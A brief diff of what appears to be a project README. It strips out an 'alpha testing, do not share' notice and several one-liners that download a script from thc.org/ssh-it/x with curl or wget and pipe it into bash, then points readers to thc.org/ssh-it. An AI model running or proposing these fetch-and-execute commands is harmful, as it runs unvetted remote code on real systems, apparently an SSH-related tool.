@@ -1,16 +1,4 @@
 
-THIS IS CURRENTLY ALPHA TESTING. DO NOT SHARE.
+YOU ARE WRONG HERE. 
 
-Use either one of these two commands to deploy:
-```
-bash -c "$(curl -fsSL thc.org/ssh-it/x)"
-```
-```
-bash -c "$(wget --no-verbose -O- thc.org/ssh-it/x)"
-```
-
-Enabling debug information:
-```
-THC_DEBUG=1 bash -c "$(curl -fsSL thc.org/ssh-it/x)"
-```
-
+PLEASE VISIT [thc.org/ssh-it](https://thc.org/ssh-it) INSTEAD.
